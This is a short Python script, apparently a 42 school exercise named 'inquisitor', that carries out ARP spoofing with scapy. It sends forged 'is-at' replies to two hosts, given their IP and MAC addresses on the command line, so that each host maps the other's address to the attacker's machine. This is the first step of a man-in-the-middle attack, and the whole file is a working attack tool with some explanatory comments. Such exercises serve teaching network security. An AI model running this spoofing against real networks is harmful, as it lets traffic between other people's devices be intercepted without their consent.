# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    inquisitor.py                                      :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: preina-g <preina-g@student.42.fr>          +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2023/06/01 15:42:21 by preina-g          #+#    #+#              #
#    Updated: 2023/06/01 17:50:53 by preina-g         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import scapy.all as scapy
import argparse

def args_parser():
    parser = argparse.ArgumentParser(description='Inquisitor - Man In The Middle Attack')
    parser.add_argument('-sI', '--Srcip', type=str, help='Source IP address')
    parser.add_argument('-sM', '--Srcmac', type=str, help='Source MAC address')
    parser.add_argument('-dI', '--Dstip', type=str, help='Destination IP address')
    parser.add_argument('-dM', '--Dstmac', type=str, help='Destination MAC address')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode')
    args = parser.parse_args()
    return args

def ARP_spoofing(srcip, srcmac, dstip, dstmac):
    """
    This function will send ARP packets to the target and the gateway to make them believe that we are the other one.
    """
    # create the ARP packet
    # op = 'is-at' to specify that we are sending a response
    packet = scapy.ARP(op="is-at", pdst=dstip, hwdst=dstmac, psrc=srcip)
    # send the packet
    # verbose = False to hide the output
    scapy.send(packet, verbose=False)
    if args_parser().verbose:
        atk_mac = scapy.ARP().hwsrc
        print("[+] Sent to {} from {} that is-at {}".format(dstip, srcip, atk_mac))
# Esta funcion es la que se encarga de enviar los paquetes ARP a la victima y al router para que piensen que somos el otro


def main():
    args = args_parser()
    if args.Srcip and args.Srcmac and args.Dstip and args.Dstmac:
        ARP_spoofing(args.Srcip, args.Srcmac, args.Dstip, args.Dstmac)
        ARP_spoofing(args.Dstip, args.Dstmac, args.Srcip, args.Srcmac)
    else:
        print("\033[31m[-] Please specify all the arguments <IP-SRC> <MAC-SRC> <IP-DST> <MAC-DST>\033[0m")
        print("[?] python3 inquisitor.py -h --help for more informations")

if __name__ == "__main__":
    main()